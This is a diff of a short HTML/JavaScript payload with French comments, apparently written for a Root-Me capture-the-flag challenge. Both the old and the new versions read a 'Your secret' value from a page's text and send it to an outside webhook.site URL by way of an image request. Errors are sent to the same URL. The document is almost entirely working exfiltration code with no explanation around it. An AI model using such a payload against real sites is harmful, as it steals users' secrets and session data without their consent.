@@ -1,21 +1,23 @@
 <html>
 <script>
-// Ouvrir la popup
-var win = window.open('http://challenge01.root-me.org:58003/profile', '_blank');
+// Optionnel : simuler une popup pour le style CTF
+var win = window.open("", "_blank"); // ouvre une popup vide
 
-// Attendre que la popup se charge
-setTimeout(function() {
+// Fonction pour exfiltrer le secret
+function exfiltrate() {
     try {
-        // Accéder au DOM de la popup
-        var secret = win.document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
-        // Exfiltrer
-        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
+        // Récupérer le texte de la page courante (admin)
+        var secret = document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
+
+        // Envoyer au webhook
+        new Image().src = "https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=" + encodeURIComponent(secret);
     } catch(e) {
-        // Envoyer l'erreur
-        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
+        // Si erreur, envoyer le message d'erreur
+        new Image().src = "https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=" + encodeURIComponent(e.message);
     }
-}, 2000);
+}
+
+// Exécuter après un petit délai pour que la page soit chargée
+setTimeout(exfiltrate, 1000);
 </script>
 </html>
-
-
